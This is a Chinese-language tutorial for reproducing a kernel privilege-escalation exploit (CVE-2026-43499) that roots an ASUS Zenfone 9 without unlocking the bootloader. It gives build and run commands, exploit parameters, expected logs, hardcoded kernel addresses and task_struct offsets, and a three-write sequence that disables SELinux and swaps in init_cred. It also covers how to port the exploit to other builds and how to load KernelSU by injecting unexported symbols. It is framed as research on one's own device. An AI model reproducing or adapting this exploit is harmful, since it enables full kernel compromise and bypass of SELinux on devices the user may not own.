# GhostLock (CVE-2026-43499) — ASUS Zenfone 9 完整重現教學

[English](TUTORIAL.md) | **繁體中文**

> 目標：在 **自有** ASUS Zenfone 9（SM8475，GKI `5.10.205-android12-9-00029-g3f12df86bfdb-ab11799032`）上，
> 透過 CVE-2026-43499 取得 root，並以 **KernelSU LKM late-load** 完成工具化 root。
> **全程不修改 boot.img / init_boot.img。**
> 僅限自有裝置授權研究。

---

## 0. 先講結論（成品）

```sh
adb shell su -c id
# uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```
- `/proc/modules` 可見 `kernelsu … Live (O)`
- KernelSU Manager 可用

---

## 1. 適用環境

| 項 | 值 |
|---|---|
| 機型 | ASUS Zenfone 9（SM8475） |
| 核心 | `5.10.205-android12-9-00029-g3f12df86bfdb-ab11799032` |
| KMI | `android12-5.10` |
| VA bits | 39（3 級頁表，4KB 頁） |
| 必要 config | `MODULES=y`、`MODVERSIONS=y`、`MODULE_SIG` **未開**、`KPROBES=y` |
| 不需要 | bootloader 解鎖、改 boot.img、adb root |

> 核心版本必須**完全一致**（偏移與 vermagic 綁定）。其他機型/版本見第 9 節。

---

## 2. 前置條件

1. Windows/Linux PC + `adb`。
2. 裝置開啟 USB 偵錯，`adb devices` 可見。
3. 裝置授權研究聲明（自有裝置）。
4. 第 3 節列出的檔案。

---

## 3. 檔案清單與來源

| 檔案 | 來源 | 用途 |
|---|---|---|
| `slide_dev` | 由 `src/` 編譯（見第 3.1 節） | exploit 主體（提權＋late-load） |
| `ksud` | KernelSU v3.3.0 release `ksud-aarch64-linux-android` | late-load 載入器（含 kallsyms 符號注入） |
| `kernelsu.ko` | release `lkm-aarch64-android12-5.10_kernelsu.ko` | KernelSU 模組 |
| `ksu.apk` | release `KernelSU_v3.3.0_32601-release.apk` | KernelSU Manager（可選） |

```sh
curl -L -o ksud        https://github.com/tiann/KernelSU/releases/download/v3.3.0/ksud-aarch64-linux-android
curl -L -o ksu.apk     https://github.com/tiann/KernelSU/releases/download/v3.3.0/KernelSU_v3.3.0_32601-release.apk
curl -L -o kernelsu.ko https://github.com/tiann/KernelSU/releases/download/v3.3.0/lkm-aarch64-android12-5.10_kernelsu.ko
```
> 實務上 **`ksud` 會自行處理 `kernelsu.ko`**（late-load 內建）。

### 3.1 重新編譯 `slide_dev`（若需）
```
aarch64-linux-android31-clang -static -O2 -DZF9_DEVICE -Isrc \
  src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/persist.c \
  src/prop.c src/cfi.c src/qmain.c src/seqoverlay.c -pthread -o slide_dev
```
（或 `sh build.sh`）

---

## 4. 一鍵流程（TL;DR）

```sh
ADB="adb"

# 1) 推送
$ADB push slide_dev /data/local/tmp/slide_dev
$ADB push ksud       /data/local/tmp/ksud
$ADB shell "chmod 755 /data/local/tmp/slide_dev /data/local/tmp/ksud"

# 2) 啟動（fresh boot 後執行；約 3–4 分鐘）
$ADB shell "pkill -9 zf9m0001; cd /data/local/tmp && nohup ./slide_dev 0x28000000 persist noslide neutral sweep 64 sweepstart=25 ownprobe shortseq >> v.log 2>&1 &"

# 3) 觀察日誌（看到 uid=0 即成功）
$ADB shell "grep -aE 'seq result|ROOT euid' /data/local/tmp/v.log"

# 4) 驗證（KernelSU su）
$ADB shell "su -c id"
# 期望：uid=0(root) ... context=u:r:ksu:s0
```

若 `su` 尚不可用（首次），先確認 `ksud late-load` 已跑（見第 5.4 節）。

---

## 5. 逐步詳解

### 5.1 為什麼要先 fresh boot？
每次開機後：spray 落點（物理頁）與 KASLR slide 皆為新值，需重新命中。
**一個 boot 只跑一次**（同 boot 重跑會落在被攪動的記憶體版圖）。

### 5.2 啟動 exploit
```
./slide_dev 0x28000000 persist noslide neutral sweep 64 sweepstart=25 ownprobe shortseq
```
- `0x28000000`：本機 `delta`（XBL 記憶體映射差）。
- `persist`：進入 exploit 路徑（**不帶數字**，故走 `shortseq` 迷你序列）。
- `noslide`：跳過舊 walk-slide，改用 **perf slide**。
- `neutral`：頁面中性化。
- `sweep 64`：噴塗候選輪數。
- `sweepstart=25`：直接從歷史黏性命中格開始（`phys=0xaccd7000`）。
- `ownprobe`：**delta-free 自寫探針**（純 userspace，零 walk 死亡）。
- `shortseq`：迷你三發序列（見第 5.3 節）。

預期日誌：
```
OWNPROBE HIT after N probes: delta=… phys=00000000accd7000 alias=ffffff802ccd7000 …
perf slide SANE anchor=… slide=…
shortseq: E3 task=ffffff88xxxxxxxx slide=…
[+] seq firing round=… step=0/1/2
seq state step=2 landed=1 uid=0 euid=0        <-- 提權成功
seq result step=3 uid=0 euid=0 gid=0 egid=0
shortseq: ROOT euid=0 - …
```

### 5.3 三發寫（短序列，核心）
| step | 動作 | 目標 |
|---|---|---|
| 0 | 關 SELinux | 將**頁對齊 alias**（byte0=0）寫入 `selinux_state`（`enforcing` 在 offset 0）→ Permissive |
| 1 | `*(task+0x778)` = `canon_addr(INIT_CRED)` | `real_cred` |
| 2 | `*(task+0x780)` = `canon_addr(INIT_CRED)` | `cred` |

- 兩發 cred 同指 `init_cred` → `cred == real_cred`（避免 exit-path `BUG_ON`）。
- 成功後**不退出**（park），避免 static cred 的 exit 問題。
- 寫原語：`rb_erase` 受限寫 `*(target)=value`（collateral `*(value+8)=target`）；`value` 必須是「可 deref 安全」的位址（因此關 SELinux 不能用 `value=0`）。

### 5.4 載入 KernelSU（late-load）
`slide_dev` 已內建：root 後自動 `fork+execl`：
```
/data/local/tmp/ksud late-load --kmi android12-5.10 --allow-shell
```
- `--kmi android12-5.10` **必須指定**（否則可能卡住）。
- ksud 輸出走 **logcat**：
  ```sh
  adb logcat -d | grep -i "KernelSU\|ksud" | tail
  # KernelSU: ksu fd installed …
  ```
- 驗證模組：
  ```sh
  adb shell "grep kernelsu /proc/modules"
  # kernelsu 200704 0 - Live 0x… (O)
  ```
- 說明：`insmod kernelsu.ko` **會失敗**（~40 個未匯出符號，如 `commit_creds`、`selinux_state`、`avc_has_perm`、`policydb_*`）。`ksud late-load` 內建 **kallsyms 解析＋符號注入**（原 `lkmloader` 功能），可繞過標準 `finit_module` 的符號檢查。

### 5.5 KernelSU Manager（可選）
```sh
adb install -r ksu.apk
```

---

## 6. 原理摘要（為什麼這樣做）

1. **漏洞**：`remove_waiter()` 在 `FUTEX_CMP_REQUEUE_PI` 代理鎖回滾路徑清錯 `current->pi_blocked_on`（應清 waiter task 的），留下指向核心棧的懸空 `rt_mutex_waiter`。
2. **觸發**：futex requeue/proxy 派工 → `task_blocks_on_rt_mutex` → `rt_mutex_adjust_prio_chain`；PI chain walk 對偽 waiter 的 rb 節點做 `rb_erase` 重鏈 → 產生受限寫 `*(target)=value`。
3. **覆蓋 waiter**：5.10 用 **`pselect6` 的 `stack_fds` 路徑**（`nfds=320` → 每 fd-set 40 bytes → `stack_fds` 正好落在 waiter 位址）寫入 10-word 偽 waiter（`tree/pi_tree/task/lock/prio/deadline`）。
   > 注意：`rt_waiter` 在 `futex_wait_requeue_pi` 是 **`sp+0x90`**（不是 `x29-0x60`）；SEQPACKET `sendmsg` 的 sockaddr 落在 `W+0x128`，**無法**覆蓋 waiter。
4. **定位**：`ownprobe`（自引用探針）免 walk 找到噴塗頁；`perf SAMPLE_IP` 解 KASLR；`perf REGS_INTR` 自定位 `task_struct`。
5. **提權**：把 `task->real_cred` / `task->cred` 指向 `init_cred`；`cred==real_cred` 成立後 `getuid()==0`。
6. **KSU**：`ksud late-load` 以 kallsyms 注入未匯出符號後載入 `kernelsu.ko`。

---

## 7. 疑難排解

| 症狀 | 原因/對策 |
|---|---|
| 找不到 `OWNPROBE HIT` | 落點漂移。改 `sweepstart=24/26`，或去掉 `sweepstart` 用完整格網（會較慢、偶有死亡格）。 |
| 進程消失、機器重啟 | 觸發了死亡格或 walk fault。**重開機**再跑（一時一開）。 |
| `insmod … Unknown symbol` | 正常。**不要用 insmod**；用 `ksud late-load --kmi android12-5.10`。 |
| `ksud late-load` 卡住 | 未帶 `--kmi`。務必指定 `--kmi android12-5.10`；並讓呼叫端不阻塞等待（`SIGCHLD=SIG_IGN`）。 |
| `su` 找不到 | 確認 `/proc/modules` 有 `kernelsu`；`/data/adb/ksu/bin` 存在；必要時重跑 `ksud late-load`。 |
| 日誌被截斷成 NUL | 內核 panic 會殺死 writeback。關鍵行已有 `fsync`，但 panic 當下仍可能丟；重開機再跑。 |
| 想讀 panic PC | 本機 ramoops 為 **pmsg-only**（無 dmesg zone），`/sys/fs/pstore` 空；需 UART 或 root 後 live dmesg。 |

---

## 8. 重開機後／持久化

- **LKM 為 per-boot**：重開機後 KernelSU 消失，需重跑第 4 節（exploit → 自動 late-load）。
- **不改 boot.img 無法在開機最早期自動觸發**（`ksuinit` 需 ramdisk）。因此採「每 boot 執行一次腳本」。
- 要真正跨重開機自動化：需 `ksud boot-patch`（改 `init_boot`）或 Magisk 式 overlay（超出本教學範圍，且會動到 boot 分區）。

可將第 4 節寫成 `run.sh` 一鍵腳本。

---

## 9. 移植到其他機型

**必須重新推導**（本教學的偏移僅適用於該 build）：
1. `delta`：由裝置 UEFI/DT 的 Kernel 記憶體映射區推算（本例 `0x28000000`）。
2. `target.h` 常數：`INIT_TASK/INIT_CRED/SELINUX_ENFORCING` 等（從 `kernel.elf` 符號取；`nm kernel.elf | grep init_cred`）。
3. `task_struct` 偏移（本例：`real_cred 0x778`、`cred 0x780`、`pi_lock 0x86c`、`pi_blocked_on 0x898`）——依核心 config 而異，需反編譯 `commit_creds` / `rt_mutex_adjust_prio_chain` 量測。
4. `rt_mutex_waiter` 佈局（5.10: `tree 0x0 / pi_tree 0x18 / task 0x30 / lock 0x38 / prio 0x40 / deadline 0x48`）。
5. KMI 與 KernelSU 版本：`ksud late-load --kmi android<ver>-5.10`。

---

## 附錄：本機關鍵常數（disasm 驗證）

```
delta                              0x28000000
KIMAGE_TEXT_BASE                   0xffffffc008000000
P0_PAGE_OFFSET                     0xffffff8000000000
P0_PHYS_OFFSET                     0x80000000
INIT_TASK                          0xffffffc00a79bec0
INIT_CRED                          0xffffffc00a7b0ae0
INIT_USER_NS                       0xffffffc00a7af6f8
SELINUX_ENFORCING (selinux_state)  0xffffffc00aa40b98   # enforcing @ offset 0
rt_mutex_adjust_prio_chain         0xffffffc0081ea980
task_blocks_on_rt_mutex            0xffffffc0081e9b84   (+0x294 -> adjust_prio_chain)
rb_erase                           0xffffffc008a705ec
commit_creds                       0xffffffc008184c94
```

## 附錄：完整驗證輸出範例
```
adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

adb shell "grep kernelsu /proc/modules"
kernelsu 200704 0 - Live 0x0000000000000000 (O)
```
